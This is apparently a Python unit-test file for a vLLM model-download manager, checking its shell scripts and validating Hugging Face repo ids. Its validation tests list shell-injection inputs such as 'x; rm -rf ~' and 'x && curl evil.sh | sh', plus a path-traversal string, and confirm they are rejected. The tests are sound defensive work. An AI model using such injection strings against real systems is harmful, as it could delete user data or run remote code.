import conftest_paths  # noqa: F401
import unittest
from unittest import mock
import vllm_download


class TestScripts(unittest.TestCase):
    def test_download_script_uses_hf_download_in_venv(self):
        self.assertIn("hf download", vllm_download.DOWNLOAD_SCRIPT)
        self.assertIn(".llamaforge/vllm-venv/bin", vllm_download.DOWNLOAD_SCRIPT)

    def test_scripts_take_the_repo_as_a_parameter(self):
        """No script may interpolate the repo id into its text."""
        for script in (vllm_download.DOWNLOAD_SCRIPT,
                       vllm_download.DELETE_SCRIPT,
                       vllm_download.DU_SCRIPT):
            self.assertIn('"$1"', script)

    def test_cache_dir_name_matches_hf_convention(self):
        self.assertEqual(vllm_download.cache_dirname("Qwen/Qwen3-8B"),
                         "models--Qwen--Qwen3-8B")

    def test_delete_script_targets_the_cache_dir(self):
        self.assertIn("rm -rf", vllm_download.DELETE_SCRIPT)
        self.assertIn(".cache/huggingface/hub", vllm_download.DELETE_SCRIPT)
        self.assertNotIn("sudo", vllm_download.DELETE_SCRIPT)


class TestRepoValidation(unittest.TestCase):
    """`repo` arrives in a request body and used to be spliced into `rm -rf`."""

    def test_shell_metacharacters_are_rejected(self):
        for bad in ("x; rm -rf ~", "x && curl evil.sh | sh", "x`id`",
                    "x$(id)", "x|y", "../../etc", "a/b/c", "x y"):
            with self.assertRaises(ValueError, msg=bad):
                vllm_download.cache_dirname(bad)

    def test_ordinary_repo_ids_are_accepted(self):
        for good in ("Qwen/Qwen3-8B", "meta-llama/Llama-3.1-8B-Instruct",
                     "org/name.v2", "bare-name"):
            self.assertTrue(vllm_download.cache_dirname(good).startswith("models--"))

    def test_delete_refuses_a_bad_id_without_running_anything(self):
        mgr = vllm_download.Manager(distro="Ubuntu")
        with mock.patch("wsl.run") as run:
            ok, err = mgr.delete("x; rm -rf ~")
        self.assertFalse(ok)
        run.assert_not_called()

    def test_start_refuses_a_bad_id_without_spawning_anything(self):
        mgr = vllm_download.Manager(distro="Ubuntu")
        with mock.patch("wsl.popen") as popen:
            self.assertFalse(mgr.start("x; rm -rf ~", expected_bytes=1))
        popen.assert_not_called()


class TestManager(unittest.TestCase):
    def test_start_guards_single_job(self):
        mgr = vllm_download.Manager(distro="Ubuntu")
        with mock.patch("wsl.popen") as popen, mock.patch("wsl.run",
                        return_value=(0, "0\n", "")):
            popen.return_value = mock.Mock(wait=lambda: 0)
            self.assertTrue(mgr.start("Qwen/Qwen3-8B", expected_bytes=1000))
            mgr.state["running"] = True
            self.assertFalse(mgr.start("other/model", expected_bytes=1000))


if __name__ == "__main__":
    unittest.main()
